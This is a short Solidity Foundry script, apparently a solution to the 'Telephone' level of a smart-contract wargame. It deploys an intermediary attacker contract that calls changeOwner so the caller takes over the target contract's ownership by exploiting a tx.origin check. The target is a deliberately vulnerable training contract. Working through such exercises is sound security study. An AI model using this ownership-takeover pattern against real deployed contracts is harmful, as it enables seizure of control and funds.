// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../src/level4.sol";

contract POC is Script {
    Telephone level4 = Telephone(0xf37EFe4255FFf123027b1145285aFCD96739F53E);
    TelephoneAttacker attacker =
        TelephoneAttacker(0xFbae9166cE4a1b512579867c0e65eB019B7fE647);
    address old_owner = level4.owner();

    function run() external {
        vm.startBroadcast();

        attacker.attack(msg.sender);

        console.log("Old owner: ", old_owner);
        console.log("New owner: ", level4.owner());
        console.log("Attacker: ", msg.sender);

        vm.stopBroadcast();
    }
}

contract TelephoneAttacker {
    Telephone telephone;

    constructor(Telephone _telephone) public {
        telephone = Telephone(_telephone);
    }

    function attack(address owner) public {
        telephone.changeOwner(owner);
    }
}
